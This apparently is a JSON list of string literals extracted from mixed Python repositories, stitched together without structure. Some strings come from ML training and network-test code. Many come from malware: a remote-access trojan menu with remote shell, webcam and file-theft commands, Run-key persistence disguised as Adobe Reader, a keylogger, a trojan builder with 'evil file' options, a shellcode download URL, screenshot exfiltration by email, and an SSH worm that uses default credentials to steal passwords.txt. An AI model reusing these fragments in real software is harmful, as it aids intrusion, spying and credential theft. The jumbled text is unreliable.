        "{yellow}{k}{reset}",
        "fc",
        "model",
        "model",
        "type(dataset)=",
        "    dataset=",
        "num_classes",
        "type(parameters)=",
        "    parameters=",
        "linear",
        "constant",
        ".pth",
        ".pth",
        "nn.Module",
        "name=",
        ".",
        "dropout",
        "d",
        "device",
        "device",
        "Invalid lr_scheduler_type=",
        ".Only \"StepLR\", \"CosineAnnealingLR\" and \"ExponentialLR\" are supported.",
        "file_path=",
        "Model ",
        " loaded from: ",
        "d",
        "Invalid lr_warmup_method=",
        ".Only \"linear\" and \"constant\" are supported.",
        "features.",
        "classifier.",
        "d",
        "d",
        "Nmap draaien van het lokaal netwerk ",
        "logs/",
        "/log_nmap.txt",
        "192.168.0.0/24",
        "-sn",
        "a",
        "mac",
        "Unknown",
        "ipv4",
        "addresses",
        "mac",
        "addresses",
        "IP Address: ",
        "MAC Address: ",
        "addresses",
        "%TEMP%",
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        "__main__",
        "Adobe ReaderX",
        "[*] Connection Established!",
        "copy %s %s",
        "192.168.56.1",
        "quit",
        "Adobe_ReaderX",
        "%TEMP%\\mw.exe",
        " Determine user inactivity based on machine and user intel.",
        "__main__",
        " Checks for keypresses or mouse clicks.",
        "okay.",
        "cbSize",
        "dwTime",
        "[*] It's been ",
        " milliseconds since the last event.",
        "screenshot",
        "__main__",
        ".bmp",
        "screenshot.bmp",
        "0.0.0.0",
        "clear",
        "cls",
        "_______________________________________",
        "[-tc] Terminate Connection             |",
        "[-ac] Append Connection to Background  |",
        "_______________________________________|",
        "[-sm] Send Message (VBS-Box)           |",
        "[-ow] Open Webpage                     |",
        "[-ss] Capture Screenshot               |",
        "[-cw] Capture Webcam                   |",
        "_______________________________________|",
        "[-si] View System Information          |",
        "[-sp] Start Process on Remote Machine  |",
        "[-pi] Remote Python Interpreter        |",
        "[-rs] Remote CMD Shell                 |",
        "[-sc] Shutdown Computer                |",
        "[-rc] Restart Computer                 |",
        "[-lc] Lock Computer                    |",
        "_______________________________________|",
        "[-cd] Get Current Directory            |",
        "[-vf] View Files                       |",
        "[-sf] Send File                        |",
        "[-rf] Receive File                     |",
        "[-dl] Delete File/Directory            |",
        "posix",
        "<",
        "",
        "code.txt",
        "Remote Directory: ",
        "f",
        "posix",
        "                                       |",
        "                                       |",
        "                                       |",
        "                                       |",
        "success",
        "wb",
        "success",
        "wb",
        ")",
        "Username: (",
        ")",
        "IP Address: (",
        ")",
        "System: (",
        " ",
        ")",
        "Public IP: (",
        "VALID",
        "code.txt",
        "w",
        "y",
        "code.txt",
        "code.txt",
        "rb",
        "SUCCESS",
        "code.txt",
        "",
        "Available Drives: (",
        "VALID",
        "rb",
        "success",
        "wb",
        "Remote File Path: ",
        "d",
        "http://",
        "https://",
        "screenshot",
        ".png",
        "Total Size: (",
        "webcam",
        ".png",
        "Total Size: (",
        "xdg-open ",
        "code.txt",
        "start ",
        "code.txt",
        "exit",
        "quit",
        "success",
        "Remote Directory: ",
        "[1] Error: (",
        ")",
        "Listening on Port: (",
        "-",
        "[2] Error: (",
        ")",
        "Computer Connected: (",
        ") (",
        "Camera Name: (",
        "cls",
        "clear",
        "cmd",
        "success",
        "help",
        "?",
        "[3] Error: (",
        ")",
        "-",
        "-",
        " ]> ",
        "clear",
        "cls",
        "clear",
        "cls",
        "-tc",
        "[ ",
        "posix",
        "",
        "clear",
        "cls",
        "-ac",
        "Error Message: ",
        "",
        "",
        "posix",
        "-sm",
        "(",
        ")> ",
        "-ow",
        "-ss",
        "-cw",
        "-si",
        "-",
        ":",
        "-sp",
        "-",
        ":",
        "-pi",
        "%H:%M:%S",
        "-rs",
        "%H:%M:%S",
        "-sc",
        "-rc",
        "Status: (",
        "-lc",
        "Status: (",
        "-cd",
        "Status: (",
        "-vf",
        "-sf",
        "-rf",
        "-dl",
        "Unrecognized Command: (",
        "192.168.43.78",
        "default",
        "Server is waiting connection with client",
        "Connected to ",
        "default",
        "#",
        "default",
        "Enter a command: ",
        "chat",
        "utf-8",
        "mode: ",
        "Send in client terminal: ",
        "utf-8",
        "the command ",
        " was executed successfully.",
        "chat",
        "[info] ",
        "chat off",
        "message sent to client terminal",
        "Writes the buffer into memory",
        "__main__",
        "http://<your-ip>:<your-port>/shellcode.bin",
        "screen.jpg",
        "screen.jpg",
        "rb",
        "smtp.gmail.com",
        "please enter your mail-id",
        "enter your mail password",
        "789sk.email@gmail.com",
        "789sk.gupta@gmail.com",
        "pip install pillow ; pip install email",
        "192.168.43.78",
        "default",
        "#",
        "utf-8",
        "default",
        "#",
        "utf-8",
        "infect",
        "chat",
        "chat on",
        "chat off",
        "default",
        "Chat mode off.",
        "chat",
        "Chat mode is already on.",
        "chat",
        "Chat mode on.",
        "hackers says: ",
        "systeeminformatie krijgen van de computer ",
        "logs/",
        "/log_sysinfo.txt",
        "a",
        "Hostnaam: ",
        "Besturingssysteem: ",
        "Kernelversie: ",
        "Gebruikersnaam: ",
        "Gebruiksduur: ",
        "whoami",
        "uptime",
        "-p",
        "df",
        "-h",
        "star",
        "tree",
        "ring",
        "line",
        "fullConnected",
        "mesh",
        "Entering",
        "tests",
        "",
        "Test #",
        "passed",
        "Error in test number",
        "for shape",
        "Network Tests Completed",
        "ring.txt",
        "star.txt",
        "mesh.txt",
        "Test",
        "Passed",
        "Test",
        "Failed",
        "fullconnect.txt",
        "line.txt",
        "tree.txt",
        "Tests Failed, Invalid shape",
        "line.txt",
        "ring.txt",
        "star.txt",
        "fullconnect.txt",
        "tree.txt",
        "mesh.txt",
        "star",
        "tree",
        "ring",
        "line",
        "fullConnected",
        "mesh",
        "star.txt",
        "tree.txt",
        "ring.txt",
        "line.txt",
        "fullConnect.txt",
        "mesh.txt",
        "",
        "",
        " ",
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        "HacKeD",
        "<ENTER>",
        "pip install pyHook ; pip install pythoncom",
        "pip install win32event ; pip install win32api ; pip install winerror",
        "pip install _winreg",
        "\\",
        "<BACK SPACE>",
        "<TAB>",
        "Size of Network",
        "time",
        "Worm Infection",
        "line.txt",
        "ring.txt",
        "star.txt",
        "tree.txt",
        "fullconnect.txt",
        "mesh.txt",
        "line",
        "ring",
        "star",
        "tree",
        "full_connect",
        "mesh",
        "upper left",
        "trojan.txt",
        "/root/.wine/drive_c/Program Files (x86)/AutoIt3/Aut2Exe/Aut2exe.exe",
        "#",
        "",
        "/icons",
        "#",
        "",
        "w",
        "\"",
        ".ico",
        "[-] Using generaic icon.",
        "/generic.ico",
        "/",
        ".",
        "wb",
        "[-] Can't find icon at ",
        ".",
        "/var/www/html/temp_",
        ",",
        "\" /Icon \"",
        "/",
        ".zip",
        "w",
        "/",
        "Local $urls = \"http://",
        "/temp_",
        ",",
        "Local $urls = \"",
        "/",
        "\" /Out \"",
        "\" /In \"",
        "wine \"",
        "-f",
        "--front-file",
        "-e",
        "--evil-file",
        "-o",
        "--out-file",
        "-i",
        "--icon",
        "-z",
        "--zip",
        "front_file_url",
        "Direct URL to file that the user will see.",
        "evil_file_url",
        "Direct URL to the evil file file.",
        "out_file_path",
        "Location to store the result.",
        "icon_path",
        "Trojan icon.",
        "zip",
        "Zip trojan?",
        "store_true",
        "Please specify front file, use --help argument for more info.",
        "Please specify evil file, use --help argument for more info.",
        "Please specify out file, use --help argument for more info.",
        "https://api.ipify.org?format=json",
        "Onbekend",
        "logs/",
        "/log_wan.txt",
        "ip",
        "a",
        "Externe IP-adres van gebruiker: ",
        "__main__",
        " Network, on which the worm spreads. ",
        " Possible SSH credentials of the victim. ",
        "192.168.1.0",
        ".",
        "user",
        "user",
        "root",
        "root",
        "msfadmin",
        "msfadmin",
        "paramiko",
        ".",
        "Trying to spread on the remote host: {}",
        "C:\\Users\\ragab\\passwords.txt",
        "victim_ragab_cridintional.txt",
        "The victim had passwords.txt",
        "C:\\Users\\ragab\\worm.py",
        "The worm is succesfully connected to the remote host [{}, {}].",
        "The victim did not have passwords.txt",
        "The remote host refused connection with credentials {},{}."
    ]
}